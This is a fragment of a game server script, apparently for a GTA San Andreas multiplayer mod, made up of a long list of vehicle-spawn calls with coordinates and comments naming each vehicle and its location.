	CreateVehicleEx(523,2282.3342,2441.3413,10.3897,358.9149,-1,-1,respawntime,0,0); // [HPV1000] LVPD1
	CreateVehicleEx(523,2259.0288,2443.1318,10.3904,1.2664,-1,-1,respawntime,0,0); // [HPV1000] LVPD1
	CreateVehicleEx(427,2241.9177,2435.7363,10.9521,0.7625,-1,-1,respawntime,0,0); // [Enforcer] LVPD1
	CreateVehicleEx(601,2295.1623,2477.1740,10.5791,180.6812,-1,-1,respawntime,0,0); // [S.W.A.T. Van] LVPD1
	CreateVehicleEx(497,2093.7824,2414.8007,74.7552,270.0059,-1,-1,respawntime,0,0); // [Police Maverick] LVPD2
	CreateVehicleEx(451,2352.2036,1405.1911,42.8203,91.8468,-1,-1,respawntime,0,0); // [Turismo] Drifts
	CreateVehicleEx(451,2352.0908,1408.6893,42.8203,91.8468,-1,-1,respawntime,0,0); // [Turismo] Drifts
	CreateVehicleEx(451,2351.9780,1412.1875,42.8203,91.8468,-1,-1,respawntime,0,0); // [Turismo] Drifts
	CreateVehicleEx(451,2351.8652,1415.6856,42.8203,91.8468,-1,-1,respawntime,0,0); // [Turismo] Drifts
	CreateVehicleEx(562,2292.4868,1387.6312,42.4795,359.2236,-1,-1,respawntime,0,0); // [Elegy] Drifts
	CreateVehicleEx(562,2353.1083,1454.9799,42.4748,89.3684,-1,-1,respawntime,0,0); // [Elegy] Drifts
	CreateVehicleEx(560,2302.1433,1405.0554,42.5252,269.7743,-1,-1,respawntime,0,0); // [Sultan] Drifts
	CreateVehicleEx(560,2353.4326,1458.5039,42.5203,89.9139,-1,-1,respawntime,0,0); // [Sultan] Drifts
	CreateVehicleEx(560,2302.6035,1437.2469,42.5301,270.0379,-1,-1,respawntime,0,0); // [Sultan] Drifts
	CreateVehicleEx(559,2301.9692,1412.2611,42.4766,270.7910,-1,-1,respawntime,0,0); // [Jester] Drifts
	CreateVehicleEx(559,2312.4245,1388.1018,42.4766,359.3172,-1,-1,respawntime,0,0); // [Jester] Drifts
	CreateVehicleEx(559,2289.0715,1387.7587,42.4766,0.2873,-1,-1,respawntime,0,0); // [Jester] Drifts
	CreateVehicleEx(538,1417.6846,2629.8666,11.3926,167.2077,-1,-1,respawntime,0,0); // [Streak] Train_LV
	CreateVehicleEx(537,-1946.5832,136.7204,26.2812,356.1506,-1,-1,respawntime,0,0); // [Freight] Train_SF
	CreateVehicleEx(400,-1944.1285,121.6819,27.2044,359.9382,-1,-1,respawntime,0,0); // [Landstalker] Train_SF
	CreateVehicleEx(400,-1944.0306,114.4770,27.1963,0.8304,-1,-1,respawntime,0,0); // [Landstalker] Train_SF
	CreateVehicleEx(409,-1944.0920,102.4899,26.9149,2.5081,-1,-1,respawntime,0,0); // [Stretch] Train_SF
	CreateVehicleEx(534,-1944.0316,86.6607,26.8295,3.2786,-1,-1,respawntime,0,0); // [Remington] Train_SF
	CreateVehicleEx(534,-1944.2413,77.3779,26.8842,0.9378,-1,-1,respawntime,0,0); // [Remington] Train_SF
	CreateVehicleEx(481,-1944.4069,94.6531,26.6744,13.6187,-1,-1,respawntime,0,0); // [BMX] Train_SF
	CreateVehicleEx(431,-1987.3371,166.8031,27.7076,1.2252,-1,-1,respawntime,0,0); // [Bus] SF
	CreateVehicleEx(431,-1994.2930,129.9189,27.7038,0.4636,-1,-1,respawntime,0,0); // [Bus] SF
	CreateVehicleEx(534,-2039.2962,133.0424,28.5636,271.3314,-1,-1,respawntime,0,0); // [Remington] SF
	CreateVehicleEx(567,-2039.7686,137.5267,28.7040,272.6023,-1,-1,respawntime,0,0); // [Savanna] SF
	CreateVehicleEx(499,-2033.6519,170.4504,28.8262,270.8798,-1,-1,respawntime,0,0); // [Benson] SF
	CreateVehicleEx(499,-2033.3801,178.9914,28.8303,271.6905,-1,-1,respawntime,0,0); // [Benson] SF
	CreateVehicleEx(409,1499.3663,-1737.2020,13.2348,90.7820,-1,-1,respawntime,0,0); // [Stretch] SF
	CreateVehicleEx(409,1466.0214,-1737.2844,13.2232,90.3377,-1,-1,respawntime,0,0); // [Stretch] SF
	CreateVehicleEx(507,1507.9450,-1749.4843,13.3719,0.7610,-1,-1,respawntime,0,0); // [Elegant] SF
	CreateVehicleEx(507,1455.8609,-1752.1885,13.3718,359.3744,-1,-1,respawntime,0,0); // [Elegant] SF
	CreateVehicleEx(596,1554.1695,-1614.7324,13.0849,0.0000,-1,-1,respawntime,0,0); // [Police Car (LSPD)] LSPD1
	CreateVehicleEx(596,1558.1695,-1614.7324,13.0849,0.0000,-1,-1,respawntime,0,0); // [Police Car (LSPD)] LSPD1
	CreateVehicleEx(596,1562.1695,-1614.7315,13.0817,0.0000,-1,-1,respawntime,0,0); // [Police Car (LSPD)] LSPD1
	CreateVehicleEx(596,1566.1695,-1614.7315,13.0817,0.0000,-1,-1,respawntime,0,0); // [Police Car (LSPD)] LSPD1
	CreateVehicleEx(596,1570.1695,-1614.7315,13.0817,0.0000,-1,-1,respawntime,0,0); // [Police Car (LSPD)] LSPD1
	CreateVehicleEx(599,1605.4193,-1629.7060,13.7136,0.0031,-1,-1,respawntime,0,0); // [Police Ranger] LSPD1
	CreateVehicleEx(599,1600.8251,-1629.6331,13.7381,0.0546,-1,-1,respawntime,0,0); // [Police Ranger] LSPD1
	CreateVehicleEx(596,1601.1810,-1687.9969,5.6108,90.1049,-1,-1,respawntime,0,0); // [Police Car (LSPD)] LSPD0
	CreateVehicleEx(596,1587.6324,-1710.2296,5.6101,359.9996,-1,-1,respawntime,0,0); // [Police Car (LSPD)] LSPD0
	CreateVehicleEx(596,1528.3199,-1687.9263,5.6119,270.5036,-1,-1,respawntime,0,0); // [Police Car (LSPD)] LSPD0
	CreateVehicleEx(597,-1573.0164,730.7636,-5.4740,89.9278,-1,-1,respawntime,0,0); // [Police Car (SFPD)] SFPD0
	CreateVehicleEx(597,-1622.4932,653.5256,-5.4977,88.3372,-1,-1,respawntime,0,0); // [Police Car (SFPD)] SFPD0
	CreateVehicleEx(597,-1595.8332,677.0096,-5.4763,359.9314,-1,-1,respawntime,0,0); // [Police Car (SFPD)] SFPD0
	CreateVehicleEx(597,-1588.2197,673.2440,6.9600,181.7641,-1,-1,respawntime,0,0); // [Police Car (SFPD)] SFPD1
	CreateVehicleEx(597,-1604.9536,652.0000,6.9562,359.3720,-1,-1,respawntime,0,0); // [Police Car (SFPD)] SFPD1
	CreateVehicleEx(597,-1612.4570,673.7398,6.9556,181.4664,-1,-1,respawntime,0,0); // [Police Car (SFPD)] SFPD1
	CreateVehicleEx(490,-1593.6916,651.3278,7.3147,0.6941,-1,-1,respawntime,0,0); // [FBI Rancher] SFPD1
	CreateVehicleEx(490,-1610.7241,652.5416,7.3140,0.6570,-1,-1,respawntime,0,0); // [FBI Rancher] SFPD1
	CreateVehicleEx(490,-1605.7546,673.8657,7.3151,181.6477,-1,-1,respawntime,0,0); // [FBI Rancher] SFPD1
	CreateVehicleEx(427,-1576.3087,682.6147,7.3191,180.2167,-1,-1,respawntime,0,0); // [Enforcer] SFPD1
	CreateVehicleEx(409,-744.8908,485.9130,1371.3691,136.0738,-1,-1,respawntime,1,0); // [Stretch] LC
	CreateVehicleEx(409,2037.7282,1017.8101,10.5426,0.0576,-1,-1,respawntime,0,0); // [Stretch] 4Dragons
	CreateVehicleEx(409,2037.6163,1000.1402,10.5424,359.2970,-1,-1,respawntime,0,0); // [Stretch] 4Dragons
	CreateVehicleEx(409,2177.3745,1691.0410,10.7170,180.0188,0,0,respawntime,0,0); // [Stretch] Caligula
	CreateVehicleEx(409,2177.2971,1677.7623,10.7248,180.0010,0,0,respawntime,0,0); // [Stretch] Caligula
	CreateVehicleEx(409,2177.7260,1665.5640,10.7162,180.0000,0,0,respawntime,0,0); // [Stretch] Caligula
	CreateVehicleEx(507,2171.2592,1714.2792,10.8707,130.0853,0,0,respawntime,0,0); // [Elegant] Caligula
	CreateVehicleEx(507,2159.4536,1644.3040,10.9258,23.2236,0,0,respawntime,0,0); // [Elegant] Caligula
	CreateVehicleEx(468,-662.4734,2305.1428,135.7335,88.6603,-1,-1,respawntime,0,0); // [Sanchez] Jump
	CreateVehicleEx(468,-662.3871,2306.7358,135.7645,84.7061,-1,-1,respawntime,0,0); // [Sanchez] Jump
	CreateVehicleEx(539,-659.2579,2303.8505,135.2727,180.3988,-1,-1,respawntime,0,0); // [Vortex] Jump
	CreateVehicleEx(470,-720.7553,2368.0717,127.1650,152.9342,-1,-1,respawntime,0,0); // [Patriot] Jump
	CreateVehicleEx(470,-696.0467,2349.2036,127.6528,337.9042,-1,-1,respawntime,0,0); // [Patriot] Jump
	CreateVehicleEx(493,2384.1694,538.6304,-0.2034,182.4556,-1,-1,respawntime,0,0); // [Jetmax] Ships
	CreateVehicleEx(493,2377.1757,538.3305,-0.2151,182.4513,-1,-1,respawntime,0,0); // [Jetmax] Ships
	CreateVehicleEx(484,2342.8813,535.6519,0.2633,180.7421,-1,-1,respawntime,0,0); // [Marquis] Ships
	CreateVehicleEx(454,2323.7153,538.1323,0.0757,181.3302,-1,-1,respawntime,0,0); // [Tropic] Ships
	CreateVehicleEx(446,2313.3225,538.1864,-0.4881,178.8532,-1,-1,respawntime,0,0); // [Squalo] Ships
	CreateVehicleEx(446,2306.5898,538.1493,-0.4910,178.8887,-1,-1,respawntime,0,0); // [Squalo] Ships
	CreateVehicleEx(447,2249.0595,420.8285,0.7835,130.7615,-1,-1,respawntime,0,0); // [Seasparrow] Ships
	CreateVehicleEx(460,2271.6743,431.4134,-0.6659,428.1565,-1,-1,respawntime,0,0); // [Skimmer] Ships
	CreateVehicleEx(473,2333.4138,540.0983,-0.1911,173.9563,-1,-1,respawntime,0,0); // [Dinghy] Ships
	CreateVehicleEx(513,1621.2480,1636.4368,10.8203,180.0000,-1,-1,respawntime,0,0); // [Stunt] LVAP
	CreateVehicleEx(513,1611.2480,1636.4368,10.8203,180.0000,-1,-1,respawntime,0,0); // [Stunt] LVAP
	CreateVehicleEx(513,1601.2480,1636.4368,10.8203,180.0000,-1,-1,respawntime,0,0); // [Stunt] LVAP
	CreateVehicleEx(513,1591.2480,1636.4368,10.8203,180.0000,-1,-1,respawntime,0,0); // [Stunt] LVAP
	CreateVehicleEx(511,1553.6727,1685.5910,10.8203,94.0347,-1,-1,respawntime,0,0); // [Beagle] LVAP
	CreateVehicleEx(487,1690.9008,1630.8008,10.9775,176.6228,-1,-1,respawntime,0,0); // [Maverick] LVAP
	CreateVehicleEx(487,1682.7778,1631.9033,10.9586,174.4607,-1,-1,respawntime,0,0); // [Maverick] LVAP
	CreateVehicleEx(487,1675.7103,1632.4825,11.0126,174.4803,-1,-1,respawntime,0,0); // [Maverick] LVAP
	CreateVehicleEx(487,1668.3263,1633.2849,10.9897,177.3535,-1,-1,respawntime,0,0); // [Maverick] LVAP
	CreateVehicleEx(487,1659.1256,1633.9598,10.9584,181.0329,-1,-1,respawntime,0,0); // [Maverick] LVAP
	CreateVehicleEx(469,1654.0900,1532.7093,10.7889,335.6674,-1,-1,respawntime,0,0); // [Sparrow] LVAP
	CreateVehicleEx(469,1667.3966,1551.9913,10.8206,142.8027,-1,-1,respawntime,0,0); // [Sparrow] LVAP
	CreateVehicleEx(469,1620.3366,1527.7495,10.8045,39.7965,-1,-1,respawntime,0,0); // [Sparrow] LVAP
	CreateVehicleEx(469,1637.0900,1533.7655,10.7990,0.4905,-1,-1,respawntime,0,0); // [Sparrow] LVAP
	CreateVehicleEx(577,1585.0640,1187.9219,10.7260,181.9892,-1,-1,respawntime,0,0); // [AT-400] LVAP
	CreateVehicleEx(485,1309.4766,1278.6934,10.4771,359.2368,-1,-1,respawntime,0,0); // [Baggage] LVAP
	CreateVehicleEx(485,1282.0938,1287.7138,10.4758,270.2222,-1,-1,respawntime,0,0); // [Baggage] LVAP
	CreateVehicleEx(485,1316.1479,1278.5760,10.4791,359.5969,-1,-1,respawntime,0,0); // [Baggage] LVAP
	CreateVehicleEx(451,1465.1682,1744.0356,10.5177,179.9860,0,0,respawntime,0,0); // [Turismo] LVAP
	CreateVehicleEx(451,1469.6214,1744.3302,10.5173,180.0000,0,0,respawntime,0,0); // [Turismo] LVAP
	CreateVehicleEx(451,1481.1829,1744.9962,10.5196,179.5632,0,0,respawntime,0,0); // [Turismo] LVAP
	CreateVehicleEx(451,1474.1007,1744.6116,10.5142,180.0000,0,0,respawntime,0,0); // [Turismo] LVAP
	CreateVehicleEx(451,1485.0222,1745.2517,10.5158,179.9860,0,0,respawntime,0,0); // [Turismo] LVAP
	CreateVehicleEx(451,1489.7453,1745.3479,10.5194,180.0000,0,0,respawntime,0,0); // [Turismo] LVAP
	CreateVehicleEx(476,1282.2291,1323.7824,11.5228,269.9993,-1,-1,respawntime,0,0); // [Rustler] LVAP
	CreateVehicleEx(476,1281.9863,1360.9285,11.5228,268.7614,-1,-1,respawntime,0,0); // [Rustler] LVAP
	CreateVehicleEx(511,1351.7957,1847.6871,12.1949,180.0000,-1,-1,respawntime,0,0); // [Beagle] LVAP
	CreateVehicleEx(401,-1655.8050,1314.5893,6.8188,133.1181,-1,-1,respawntime,0,0); // [Bravura] Docks
	CreateVehicleEx(533,-1641.8706,1300.4423,6.7401,134.4548,1,1,respawntime,0,0); // [Feltzer] Docks
	CreateVehicleEx(402,-1645.3706,1304.2730,6.8605,136.4038,-1,-1,respawntime,0,0); // [Buffalo] Docks
	CreateVehicleEx(484,-1519.8730,1383.5177,0.1336,341.0500,-1,-1,respawntime,0,0); // [Marquis] Docks
	CreateVehicleEx(484,-1504.5718,1359.2880,0.0624,267.5056,-1,-1,respawntime,0,0); // [Marquis] Docks
	CreateVehicleEx(454,-1892.0642,1401.2849,0.2454,90.9977,-1,-1,respawntime,0,0); // [Tropic] Docks
	CreateVehicleEx(478,845.5010,872.5704,13.6042,204.9464,-1,-1,respawntime,0,0); // [Walton] Sandkings
	CreateVehicleEx(478,841.3457,870.2996,13.6070,205.5118,-1,-1,respawntime,0,0); // [Walton] Sandkings
	CreateVehicleEx(495,845.1049,845.8532,13.3515,207.3749,-1,-1,respawntime,0,0); // [Sandking] Sandkings
	CreateVehicleEx(495,839.3328,842.8645,13.3515,207.3749,-1,-1,respawntime,0,0); // [Sandking] Sandkings
	CreateVehicleEx(495,833.5607,839.8757,13.3515,207.3749,-1,-1,respawntime,0,0); // [Sandking] Sandkings
	CreateVehicleEx(495,827.7886,836.8869,13.3515,207.3749,-1,-1,respawntime,0,0); // [Sandking] Sandkings
	CreateVehicleEx(495,847.7822,839.9378,13.3515,208.6282,-1,-1,respawntime,0,0); // [Sandking] Sandkings 1
	CreateVehicleEx(495,842.0768,836.8234,13.3515,208.6282,-1,-1,respawntime,0,0); // [Sandking] Sandkings
	CreateVehicleEx(495,836.3714,833.7091,13.3515,208.6282,-1,-1,respawntime,0,0); // [Sandking] Sandkings
	CreateVehicleEx(495,830.6660,830.5948,13.3515,208.6282,-1,-1,respawntime,0,0); // [Sandking] Sandkings 1
	CreateVehicleEx(468,824.2017,859.1218,12.2540,202.7591,-1,-1,respawntime,0,0); // [Sanchez] Sandkings
	CreateVehicleEx(468,822.3574,858.3480,12.2540,202.7591,-1,-1,respawntime,0,0); // [Sanchez] Sandkings
	CreateVehicleEx(468,820.5131,857.5743,12.2540,202.7591,-1,-1,respawntime,0,0); // [Sanchez] Sandkings
	CreateVehicleEx(471,829.3895,861.2539,12.5859,200.2525,-1,-1,respawntime,0,0); // [Quad] Sandkings
	CreateVehicleEx(471,827.5131,860.5616,12.5859,200.2525,-1,-1,respawntime,0,0); // [Quad] Sandkings
	CreateVehicleEx(471,825.6368,859.8693,12.5859,200.2525,-1,-1,respawntime,0,0); // [Quad] Sandkings
	CreateVehicleEx(522,1863.8895,-1396.4996,13.4839,270.0000,-1,-1,respawntime,0,0); // [NRG-500] Ramp
	CreateVehicleEx(522,1863.8895,-1400.4996,13.4839,270.0000,-1,-1,respawntime,0,0); // [NRG-500] Ramp
	CreateVehicleEx(522,1863.8895,-1404.4996,13.4839,270.0000,-1,-1,respawntime,0,0); // [NRG-500] Ramp
	CreateVehicleEx(522,1863.8895,-1408.4996,13.4839,270.0000,-1,-1,respawntime,0,0); // [NRG-500] Ramp
	CreateVehicleEx(522,1863.8895,-1412.4996,13.4839,270.0000,-1,-1,respawntime,0,0); // [NRG-500] Ramp
	CreateVehicleEx(510,1910.8059,-1416.3952,13.5703,360.0000,-1,-1,respawntime,0,0); // [Mountain Bike] Ramp
	CreateVehicleEx(510,1912.9058,-1416.3952,13.5703,360.0000,-1,-1,respawntime,0,0); // [Mountain Bike] Ramp
	CreateVehicleEx(510,1915.0058,-1416.3952,13.5703,360.0000,-1,-1,respawntime,0,0); // [Mountain Bike] Ramp
	CreateVehicleEx(509,1918.1099,-1416.2520,13.5703,364.4343,-1,-1,respawntime,0,0); // [Bike] Ramp
	CreateVehicleEx(509,1920.2037,-1416.0897,13.5703,364.4343,-1,-1,respawntime,0,0); // [Bike] Ramp
	CreateVehicleEx(509,1922.2974,-1415.9273,13.5703,364.4343,-1,-1,respawntime,0,0); // [Bike] Ramp
	CreateVehicleEx(481,1959.3281,-1394.6031,15.0499,63.5904,-1,-1,respawntime,0,0); // [BMX] Ramp
	CreateVehicleEx(481,1958.6099,-1381.4084,18.0988,316.1287,-1,-1,respawntime,0,0); // [BMX] Ramp
	CreateVehicleEx(481,1963.7370,-1363.0479,18.0869,18.6786,-1,-1,respawntime,0,0); // [BMX] Ramp
	CreateVehicleEx(461,1922.4433,-1448.1485,13.4699,360.0000,-1,-1,respawntime,0,0); // [PCJ-600] Ramp
	CreateVehicleEx(461,1924.9433,-1448.1485,13.4699,360.0000,-1,-1,respawntime,0,0); // [PCJ-600] Ramp
	CreateVehicleEx(461,1927.4433,-1448.1485,13.4699,360.0000,-1,-1,respawntime,0,0); // [PCJ-600] Ramp
	CreateVehicleEx(521,1931.0447,-1448.2238,13.4681,363.4148,-1,-1,respawntime,0,0); // [FCR-900] Ramp
	CreateVehicleEx(521,1933.5404,-1448.0749,13.4681,363.4148,-1,-1,respawntime,0,0); // [FCR-900] Ramp
	CreateVehicleEx(521,1936.0360,-1447.9260,13.4681,363.4148,-1,-1,respawntime,0,0); // [FCR-900] Ramp
	CreateVehicleEx(560,2141.8759,1025.7836,10.5255,270.6545,-1,-1,respawntime,0,0); // [Sultan] Las Venturas
	CreateVehicleEx(451,2354.3737,740.1822,11.1397,180.7101,-1,-1,respawntime,0,0); // [Turismo] Las Venturas
	CreateVehicleEx(603,2172.8637,1119.3103,12.4544,331.6668,-1,-1,respawntime,0,0); // [Phoenix] Las Venturas
	CreateVehicleEx(403,2130.5087,889.4801,11.4604,359.7188,-1,-1,respawntime,0,0); // [Linerunner] Las Venturas
	CreateVehicleEx(406,2165.8322,913.4907,12.3417,89.9506,-1,-1,respawntime,0,0); // [Dumper] Las Venturas
	CreateVehicleEx(567,2039.6109,1246.8894,10.5396,180.6252,-1,-1,respawntime,0,0); // [Savanna] Las Venturas
	CreateVehicleEx(439,2635.8156,1076.1434,10.7162,87.6815,-1,-1,respawntime,0,0); // [Stallion] Las Venturas
	CreateVehicleEx(439,2037.4643,1178.7553,10.6380,180.0027,-1,-1,respawntime,0,0); // [Stallion] Las Venturas
	CreateVehicleEx(541,2353.8933,660.9909,11.0879,180.3174,-1,-1,respawntime,0,0); // [Bullet] Las Venturas
	CreateVehicleEx(589,2039.4062,1133.3902,10.3234,180.4552,-1,-1,respawntime,0,0); // [Club] Las Venturas
	CreateVehicleEx(565,1947.6574,949.0521,10.4462,177.4226,-1,-1,respawntime,0,0); // [Flash] Las Venturas
	CreateVehicleEx(402,2076.6596,1059.6551,10.5748,180.6535,-1,-1,respawntime,0,0); // [Buffalo] Las Venturas
	CreateVehicleEx(461,-1471.9132,1557.4838,1052.1231,359.6397,-1,-1,respawntime,14,32); // [PCJ-600] Moto
	CreateVehicleEx(461,-1469.4172,1557.4995,1052.1201,0.0000,-1,-1,respawntime,14,32); // [PCJ-600] Moto
	CreateVehicleEx(461,-1466.9169,1557.4903,1052.0476,359.9920,-1,-1,respawntime,14,32); // [PCJ-600] Moto
	CreateVehicleEx(461,-1464.4169,1557.4903,1052.0476,359.9920,-1,-1,respawntime,14,32); // [PCJ-600] Moto
	CreateVehicleEx(521,-1461.0828,1557.2449,1052.0592,0.0000,-1,-1,respawntime,14,32); // [FCR-900] Moto
	CreateVehicleEx(521,-1458.5828,1557.2449,1052.0592,0.0000,-1,-1,respawntime,14,32); // [FCR-900] Moto
	CreateVehicleEx(521,-1456.0828,1557.2449,1052.0592,0.0000,-1,-1,respawntime,14,32); // [FCR-900] Moto
	CreateVehicleEx(521,-1453.5828,1557.2468,1052.1041,359.9999,-1,-1,respawntime,14,32); // [FCR-900] Moto
	CreateVehicleEx(522,-1449.1428,-213.1744,13.7117,72.5970,-1,-1,respawntime,0,0); // [NRG-500] Stunts
	CreateVehicleEx(522,-1448.2456,-210.3117,13.7117,72.5970,-1,-1,respawntime,0,0); // [NRG-500] Stunts
	CreateVehicleEx(522,-1447.3483,-207.4490,13.7117,72.5970,-1,-1,respawntime,0,0); // [NRG-500] Stunts
	CreateVehicleEx(522,-1446.4378,-204.5905,14.1484,432.5970,-1,-1,respawntime,0,0); // [NRG-500] Stunts
	CreateVehicleEx(522,-1445.5406,-201.7278,14.1484,432.5970,-1,-1,respawntime,0,0); // [NRG-500] Stunts
	CreateVehicleEx(522,-1444.6434,-198.8651,14.1484,432.5970,-1,-1,respawntime,0,0); // [NRG-500] Stunts
	CreateVehicleEx(522,-1469.6705,-211.6902,13.6235,352.0693,-1,-1,respawntime,0,0); // [NRG-500] Moto
	CreateVehicleEx(522,-1467.1944,-212.0352,13.6235,352.0693,-1,-1,respawntime,0,0); // [NRG-500] Moto
	CreateVehicleEx(522,-1464.7175,-212.3725,13.7145,352.0696,-1,-1,respawntime,0,0); // [NRG-500] Moto
	CreateVehicleEx(522,-1462.2423,-212.7209,13.7189,352.0676,-1,-1,respawntime,0,0); // [NRG-500] Moto
	CreateVehicleEx(557,1331.6639,2189.6416,11.3433,182.1402,-1,-1,respawntime,0,0); // [Monster Truck C] Bumper
	CreateVehicleEx(557,1324.9224,2189.5847,11.3433,181.8562,-1,-1,respawntime,0,0); // [Monster Truck C] Bumper
	CreateVehicleEx(557,1318.5240,2190.5871,11.4242,177.2696,-1,-1,respawntime,0,0); // [Monster Truck C] Bumper
	CreateVehicleEx(468,1382.9283,2184.9484,10.6930,139.9373,-1,-1,respawntime,0,0); // [Sanchez] Bumper
	CreateVehicleEx(468,1385.9182,2184.8674,10.6921,147.3654,-1,-1,respawntime,0,0); // [Sanchez] Bumper
	CreateVehicleEx(468,1379.9351,2185.7785,10.6911,146.9065,-1,-1,respawntime,0,0); // [Sanchez] Bumper
	CreateVehicleEx(539,1395.3223,2152.0490,10.3834,93.1922,-1,-1,respawntime,0,0); // [Vortex] Bumper
	CreateVehicleEx(539,1395.3095,2142.5854,10.4414,92.2089,-1,-1,respawntime,0,0); // [Vortex] Bumper
	CreateVehicleEx(539,1395.5800,2133.5148,10.3834,89.9463,-1,-1,respawntime,0,0); // [Vortex] Bumper
	CreateVehicleEx(471,1396.1510,2117.9265,10.4666,90.0488,-1,-1,respawntime,0,0); // [Quad] Bumper
	CreateVehicleEx(471,1396.3664,2106.3444,10.4668,90.0353,-1,-1,respawntime,0,0); // [Quad] Bumper
	CreateVehicleEx(471,1396.0345,2128.5910,10.4664,89.3800,-1,-1,respawntime,0,0); // [Quad] Bumper
	CreateVehicleEx(463,1306.0062,2104.6613,10.5572,1.3092,-1,-1,respawntime,0,0); // [Freeway] Bumper
	CreateVehicleEx(463,1310.1267,2104.7272,10.5545,357.1008,-1,-1,respawntime,0,0); // [Freeway] Bumper
	CreateVehicleEx(463,1308.1879,2104.5405,10.5552,359.0767,-1,-1,respawntime,0,0); // [Freeway] Bumper
	CreateVehicleEx(481,1532.9162,-1368.1834,328.9784,138.6179,-1,-1,respawntime,0,0); // [BMX] Tower
	CreateVehicleEx(481,1550.5800,-1340.6701,328.9752,335.3208,-1,-1,respawntime,0,0); // [BMX] Tower
	CreateVehicleEx(481,1528.8560,-1347.9539,328.9757,68.5325,-1,-1,respawntime,0,0); // [BMX] Tower
	CreateVehicleEx(481,1526.5830,-1358.6878,328.9854,99.2250,-1,-1,respawntime,0,0); // [BMX] Tower
	CreateVehicleEx(481,1544.5325,-1371.7387,328.9591,186.5614,-1,-1,respawntime,0,0); // [BMX] Tower
	CreateVehicleEx(481,1563.0200,-1358.7126,329.0228,261.4073,-1,-1,respawntime,0,0); // [BMX] Tower
	CreateVehicleEx(481,1556.2669,-1368.1042,328.9696,219.2796,-1,-1,respawntime,0,0); // [BMX] Tower
	CreateVehicleEx(481,1560.2200,-1347.5341,328.9758,300.3055,-1,-1,respawntime,0,0); // [BMX] Tower
	CreateVehicleEx(481,1538.2677,-1340.7329,328.9766,29.1413,-1,-1,respawntime,0,0); // [BMX] Tower
	CreateVehicleEx(567,2506.8120,-1676.4316,13.3240,147.9375,-1,-1,respawntime,0,0); // [Savanna] Los Santos
	CreateVehicleEx(567,2482.3269,-1684.2244,13.2844,267.9341,-1,-1,respawntime,0,0); // [Savanna] Los Santos
	CreateVehicleEx(567,2482.6638,-1653.1589,13.2580,90.5576,-1,-1,respawntime,0,0); // [Savanna] Los Santos
	CreateVehicleEx(412,1063.1511,-1752.0017,13.2847,269.8548,-1,-1,respawntime,0,0); // [Voodoo] Los Santos
	CreateVehicleEx(412,1588.5369,-1405.1475,13.7020,271.7003,-1,-1,respawntime,0,0); // [Voodoo] Los Santos
	CreateVehicleEx(402,1687.1752,-1797.7355,13.2145,0.2588,-1,-1,respawntime,0,0); // [Buffalo] Los Santos
	CreateVehicleEx(402,1993.5871,-1275.1833,23.6518,179.3535,-1,-1,respawntime,0,0); // [Buffalo] Los Santos
	CreateVehicleEx(405,1066.3450,-1196.2781,19.3320,1.5929,-1,-1,respawntime,0,0); // [Sentinel] Los Santos
	CreateVehicleEx(405,1763.2784,-1860.1138,13.3654,90.5276,-1,-1,respawntime,0,0); // [Sentinel] Los Santos
	CreateVehicleEx(426,1891.1905,-1937.4086,13.2021,267.0976,-1,-1,respawntime,0,0); // [Premier] Los Santos
	CreateVehicleEx(426,1098.5692,-1763.8245,13.0931,90.2041,-1,-1,respawntime,0,0); // [Premier] Los Santos
	CreateVehicleEx(473,963.8510,-1943.2963,-0.3065,205.7895,-1,-1,respawntime,0,0); // [Dinghy] Los Santos
	CreateVehicleEx(473,962.4470,-1957.9884,-0.3769,123.5024,-1,-1,respawntime,0,0); // [Dinghy] Los Santos
	CreateVehicleEx(473,961.0462,-1946.1010,-0.2929,112.4124,-1,-1,respawntime,0,0); // [Dinghy] Los Santos
	CreateVehicleEx(411,2113.5339,1409.2052,10.5438,179.6341,-1,-1,respawntime,0,0); // [Infernus] Park1
	CreateVehicleEx(415,2126.4479,1408.7750,10.5657,359.9332,-1,-1,respawntime,0,0); // [Cheetah] Park1
	CreateVehicleEx(419,2100.7272,1408.6445,10.6215,179.6755,-1,-1,respawntime,0,0); // [Esperanto] Park1
	CreateVehicleEx(429,2110.4365,1397.6313,10.4908,178.2342,-1,-1,respawntime,0,0); // [Banshee] Park1
	CreateVehicleEx(458,2135.9704,1398.2319,10.6986,358.9440,-1,-1,respawntime,0,0); // [Solair] Park1
	CreateVehicleEx(463,2162.5302,1013.5533,10.3654,266.7797,-1,-1,respawntime,0,0); // [Freeway] Park2
	CreateVehicleEx(463,2122.4306,988.0965,10.3277,177.8312,-1,-1,respawntime,0,0); // [Freeway] Park2
	CreateVehicleEx(429,2141.7131,1012.9666,10.4718,90.5121,-1,-1,respawntime,0,0); // [Banshee] Park2
	CreateVehicleEx(467,2172.0927,1022.4714,10.5618,270.9039,-1,-1,respawntime,0,0); // [Oceanic] Park2
	CreateVehicleEx(481,2182.7529,986.6168,10.3379,356.2692,-1,-1,respawntime,0,0); // [BMX] Park2
	CreateVehicleEx(481,2162.9555,1025.9121,10.3301,92.3854,-1,-1,respawntime,0,0); // [BMX] Park2
	CreateVehicleEx(477,2162.8574,1006.5831,10.5760,90.5009,-1,-1,respawntime,0,0); // [ZR-350] Park2
	CreateVehicleEx(423,2148.1757,987.3773,10.8430,0.5526,-1,-1,respawntime,0,0); // [Mr Whoopee] Park2
	CreateVehicleEx(423,2138.5512,987.8300,10.8015,0.1169,-1,-1,respawntime,0,0); // [Mr Whoopee] Park2
	CreateVehicleEx(555,2132.4562,1016.2584,10.5051,90.3182,-1,-1,respawntime,0,0); // [Windsor] Park2
	CreateVehicleEx(461,2188.8085,986.4786,10.4056,357.9648,-1,-1,respawntime,0,0); // [PCJ-600] Park2
	CreateVehicleEx(539,1976.0778,1915.6118,130.2953,272.1173,-1,-1,respawntime,0,0); // [Vortex] BuildVortext
	CreateVehicleEx(539,1959.0113,1925.8072,130.2975,29.8759,-1,-1,respawntime,0,0); // [Vortex] BuildVortext
	CreateVehicleEx(539,1958.9361,1906.5283,130.2975,152.6729,-1,-1,respawntime,0,0); // [Vortex] BuildVortext
	CreateVehicleEx(411,2076.3515,2468.8930,10.5473,1.3025,-1,-1,respawntime,0,0); // [Infernus] Park3
	CreateVehicleEx(451,2061.3984,2480.3730,10.5279,178.9317,-1,-1,respawntime,0,0); // [Turismo] Park3
	CreateVehicleEx(541,2052.9277,2480.1945,10.4479,179.4710,-1,-1,respawntime,0,0); // [Bullet] Park3
	CreateVehicleEx(480,2086.5808,2479.7036,10.5934,359.1442,-1,-1,respawntime,0,0); // [Comet] Park3
	CreateVehicleEx(489,2098.3618,2507.1462,10.9648,269.9862,-1,-1,respawntime,0,0); // [Rancher] Park3
